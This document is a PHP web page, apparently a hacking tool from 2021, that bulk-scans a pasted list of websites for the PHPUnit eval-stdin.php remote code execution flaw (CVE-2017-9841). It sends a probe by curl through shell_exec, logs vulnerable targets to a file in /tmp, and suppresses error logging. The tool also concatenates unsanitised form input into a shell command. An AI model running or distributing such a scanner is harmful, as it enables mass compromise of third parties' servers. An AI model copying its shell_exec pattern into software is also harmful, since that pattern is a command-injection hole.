<html>
<head>
<title>[+] Mass eval-stdin Scanner [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white"><center>
  <style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
.courier {
  font-family: Courier;
}
.notvuln {
  color: red;
}
.vuln {
  color: green;
}
</style>
<form method="post" enctype="multipart/form-data">
<font face=courier size=5>Mass eval-stdin Scanner<br>
  <font size="3">Scan Vuln RCE on Eval Stdin (CVE-2017-9841)</font></font><hr>
<textarea name="web" placeholder="https://exploits.my.id/
Cukup Masukkan Url Tanpa eval-stdin.php"></textarea><br><br>
<input type="submit" name="startbf" value="Gaskan">
</form>
<?php
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$web = $_POST['web'];
if (!file_exists("/tmp/tempku")) {
  mkdir("/tmp/tempku");
}
if ($web) {
  $cok = explode("\r\n", $web);
  echo "<font><hr>Loading ( <font color=orange>".count($cok)."</font> Sites )</font>";
  echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
  foreach ($cok as $webs) {
    ob_implicit_flush(true);ob_end_flush();
    $ekse = shell_exec('curl -Lsk --ipv4 -d "unknown45kece" '.$webs.'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --max-time 5 | grep -e "unknown45kece"');
    if (!substr($ekse, -13) == "unknown45kece") {
      echo $webs." -> [<exp class=notvuln>Not Vuln</exp>]<br>";
    } else {
      $sayu = $webs."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -> [<exp class=vuln>Vuln</exp>]<br>";
      echo $sayu;
      file_put_contents("/tmp/tempku/hasil-eval.txt", $webs."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n", FILE_APPEND);
    }
  }
}
echo "</pre>";
?>
<hr><font size="3">Unknown45 - 2021</font>